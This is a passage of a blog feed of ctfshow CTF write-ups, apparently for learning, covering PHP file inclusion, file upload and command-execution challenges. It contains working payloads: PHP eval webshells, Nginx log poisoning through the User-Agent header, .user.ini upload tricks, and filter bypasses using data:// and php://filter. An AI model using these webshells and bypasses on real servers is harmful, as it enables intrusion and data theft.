class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>php被过滤了，但是还有data得哇,不慌</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data:<span class="regexp">//</span>text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span><br></pre></td></tr></table></figure><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1651061854053.png" alt="1651061854053"></p><h1><span id="web80">web80</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>data协议也被ban了，但是还可以用日志包含文件</p><p> 通过Wappalyzer得知中间件是Nginx  ，访问其默认日志文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/<span class="keyword">var</span>/log/nigix/access.log</span><br></pre></td></tr></table></figure><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1651128184185.png" alt="1651128184185"></p><p>发现User-Agent可以写shell</p><p>拆入一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;attack&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>连接拿到flag</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1651128463997.png" alt="1651128463997"></p><h1><span id="web81">web81</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多过滤了冒号，但不影响，同上</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;web78&quot;&gt;web78&lt;/span&gt;&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span </summary>
      
    
    
    
    <category term="web" scheme="http://zzuzyj.github.io/categories/web/"/>
    
    
    <category term="web" scheme="http://zzuzyj.github.io/tags/web/"/>
    
    <category term="ctfshow" scheme="http://zzuzyj.github.io/tags/ctfshow/"/>
    
    <category term="文件包含" scheme="http://zzuzyj.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow文件上传</title>
    <link href="http://zzuzyj.github.io/2022/05/03/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>http://zzuzyj.github.io/2022/05/03/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2022-05-03T09:23:29.885Z</published>
    <updated>2022-04-30T08:29:06.000Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="web151">web151</span></h1><p>提示说前端验证不可靠，说明这一题后端没有做验证处理，直接改前端绕过即可。</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1651302222597.png" alt="1651302222597"></p><p>用蚁剑连接上找到flag</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1651302458310.png" alt="1651302458310"></p><h1><span id="web152">web152</span></h1><p>先如上题一样，发现</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1651302831942.png" alt="1651302831942"></p><p>上传失败，说明后端进行了简单的验证</p><p>抓包看一下</p><p>直接改后缀名</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1651303206167.png" alt="1651303206167"></p><p>不行，unicode解码发现返回文件类型不合，更改文件类型发现能访问但是没有解析执行shell</p><p>，将文件名改为php试一下</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1651303858907.png" alt="1651303858907"></p><p>上传成功，蚁剑连接拿到flag</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1651304014493.png" alt="1651304014493"></p><h1><span id="web153">web153</span></h1><p>用上一题的走了一遍，发现不行了，八成是后端对文件内容或者是文件后缀进行了检验，直接上传一张图片</p><p>，抓包更改参数</p><p>先尝试是否过滤后缀名</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1651304783681.png" alt="1651304783681"></p><p>返回错误，过滤了</p><p>此路不通。上传.user.ini文件试试</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1651305223169.png" alt="1651305223169"></p><p>上传成功</p><p>继续上传1.txt</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1651305634263.png" alt="1651305634263"></p><p>蚁剑连接，拿到flag</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1651305678880.png" alt="1651305678880"></p><h1><span id="web154">web154</span></h1><p>直接传一手.user.ini成功</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1651306064666.png" alt="1651306064666"></p><p>但是上传txt文件发现抱错文件内容不合</p><p>我们更改二进制文件头</p><p>返回仍旧错误</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1651306338734.png" alt="1651306338734"></p><p>把一句话木马删除，成功了，说明检测到了一句话木马不让过</p><p>更改木马语句为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>还是不行，把php大写，过了，说明检测了php的存在，将语句改为短标签写法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;attack&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传成功了</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1651306666449.png" alt="1651306666449"></p><p>蚁剑连接拿到flag</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1651306889385.png" alt="1651306889385"></p><h1><span id="文件上传总结">文件上传总结</span></h1><p><strong>1</strong>  前端绕过</p><p><strong>2</strong> 抓包绕过文件类型</p><p><strong>3</strong> .user.ini  实现php解析</p><p><strong>4</strong> 语句过滤php可以改为短标签写法</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;web151&quot;&gt;web151&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;提示说前端验证不可靠，说明这一题后端没有做验证处理，直接改前端绕过即可。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://zzuzyj.github.io/2022/05/03/ctfshow%</summary>
      
    
    
    
    <category term="web" scheme="http://zzuzyj.github.io/categories/web/"/>
    
    
    <category term="web" scheme="http://zzuzyj.github.io/tags/web/"/>
    
    <category term="ctfshow" scheme="http://zzuzyj.github.io/tags/ctfshow/"/>
    
    <category term="文件上传" scheme="http://zzuzyj.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow命令执行1</title>
    <link href="http://zzuzyj.github.io/2022/05/03/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C1/"/>
    <id>http://zzuzyj.github.io/2022/05/03/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C1/</id>
    <published>2022-05-03T09:23:29.880Z</published>
    <updated>2022-04-27T11:57:28.000Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#web29">web29</a></li><li><a href="#web30">web30</a></li><li><a href="#web31">web31</a></li><li><a href="#web32">web32</a></li><li><a href="#web33">web33</a></li><li><a href="#web34">web34</a></li><li><a href="#web35">web35</a></li><li><a href="#web36">web36</a></li></ul><!-- tocstop --><h1><span id="web29">web29</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">*/</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析：过滤了flag，但是有一个eval函数，可以将传参当成代码执行，可以利用一下</p><p>测试发现没有过滤system函数</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C1/1651052464566.png" alt="1651052464566"></p><p>构造?c=system(‘cp f?ag.php 111.txt’);</p><p>访问111.txt得到flag</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C1/1651052654939.png" alt="1651052654939"></p><h1><span id="web30">web30</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">*/</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>叫上题相比多过滤了php和sysytem, 但是使用反引号其实是和system相同的作用，</p><p>过滤了php可以用占位符?代替</p><p>构造?c=<code>cp fla?.??? 111.txt</code>;</p><p>访问拿到flag</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C1/1651053164955.png" alt="1651053164955"></p><h1><span id="web31">web31</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又多过滤了点，空格等等</p><p>eval嵌套执行命令</p><p>构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">111</span>]);&amp;<span class="number">111</span>=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure><p>命令成功执行</p><p>继续</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">111</span>]);&amp;<span class="number">111</span>=`cp%<span class="number">20</span>flag.php%<span class="number">20111</span>.txt`;</span><br></pre></td></tr></table></figure><p>成功拿到</p><p><img src="http://zzuzyj.github.io/2022/05/03/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C1/1651057740660.png" alt="1651057740660"></p><h1><span id="web32">web32</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又ban了几个符号</p><p>分号被ban掉，我们可以尝试用?&gt;代替，因为php结尾最后一句不用写分号,反引号也ban了</p><p>可以通过文件包含将flag.php包含以进行读取</p><p>构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">include</span>%<span class="number">0</span>a<span class="variable">$_GET</span>[<span class="number">111</span>]<span class="meta">?&gt;</span>&amp;<span class="number">111</span>=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br><span class="line">filter：通过指定的通道来读取指定的文件</span><br><span class="line">这里使用base64读取</span><br><span class="line">不用base64读不到源文件</span><br></pre></td></tr></table></figure><p>得到源码的base64形式，解码得到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:49:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:49:26</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;ctfshow&#123;72ed316e-44a9-4e6a-9e15-cfaa9f15ddd6&#125;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1><span id="web33">web33</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了双引号，好像上一题的方法可以搬过来。</p><p>又学了一招，文件包含还可以用require</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">require</span>%<span class="number">0</span>a<span class="variable">$_GET</span>[lll]<span class="meta">?&gt;</span>&amp;lll=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br><span class="line"><span class="comment">#解开base64得flag</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:49:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:49:26</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;ctfshow&#123;b7e7c748-9729-425b-b08d-fc9d9100a6ac&#125;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1><span id="web34">web34</span></h1><p>过滤了冒号，，，不知道还有啥方法</p><p>老套路掏出来</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=require%<span class="number">0</span>a<span class="variable">$_GET</span>[lll]?&gt;&amp;lll=php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=flag.php</span><br></pre></td></tr></table></figure><p>解码拿到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:49:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:49:26</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;ctfshow&#123;ba628d0f-c1d5-46aa-9443-5787a12426be&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><h1><span id="web35">web35</span></h1><p>payload还能用，，秒了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">require</span>%<span class="number">0</span>a<span class="variable">$_GET</span>[lll]<span class="meta">?&gt;</span>&amp;lll=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><p>略</p><h1><span id="web36">web36</span></h1><p>咳咳，秒了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">require</span>%<span class="number">0</span>a<span class="variable">$_GET</span>[lll]<span class="meta">?&gt;</span>&amp;lll=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><p>略</p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- toc --&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#web29&quot;&gt;web29&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#web30&quot;&gt;web30&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#web31&quot;&gt;web31&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#</summary>
      
    
    
    
    <category term="web" scheme="http://zzuzyj.github.io/categories/web/"/>
    
    
    <category term="web" scheme="http://zzuzyj.github.io/tags/web/"/>
    
    <category term="ctfshow" scheme="http://zzuzyj.github.io/tags/ctfshow/"/>
    
    <category term="命令执行" scheme="http://zzuzyj.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://zzuzyj.github.io/2022/05/03/ctfshow%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://zzuzyj.github.io/2022/05/03/ctfshow%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2022-05-03T09:23:29.875Z</published>
    <updated>2022-04-28T06:54:56.000Z</updated>
    
